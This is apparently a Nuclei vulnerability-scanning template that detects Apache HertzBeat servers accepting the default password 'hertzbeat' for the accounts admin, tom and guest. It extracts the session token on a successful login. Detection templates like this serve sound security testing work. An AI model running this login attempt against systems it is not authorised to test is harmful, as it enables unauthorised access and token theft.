id: apache-hertzbeat-weak-password
info:
  name: Apache HertzBeat Weak Password Vulnerability
  author: ProjectDiscoveryAI
  severity: medium
  tags: weak-password
  description: |
    This template checks for weak password vulnerabilities in the Apache HertzBeat real-time monitoring system. It attempts login with common weak credentials and detects successful authentication.

variables:
  username:
    - admin
    - tom
    - guest

flow: |
  http(1) && http(2)

http:
  - id: homepage-check
    method: GET
    path:
      - "{{BaseURL}}/"
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "HertzBeat"
      - type: status
        status:
          - 200

  - id: auth-check
    method: POST
    path:
      - "{{BaseURL}}/api/account/auth/form"
    headers:
      Content-Type: application/json
    body: |-
      {"type":0,"identifier":"{{username}}","credential":"hertzbeat"}
    payloads:
      username: '{{username}}'
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "\"data\":"
          - "\"token\":"
          - "\"refreshToken\":"
      - type: word
        part: header
        words:
          - "application/json"
      - type: status
        status:
          - 200
    stop-at-first-match: true
    extractors:
      - type: json
        json:
          - '.token'
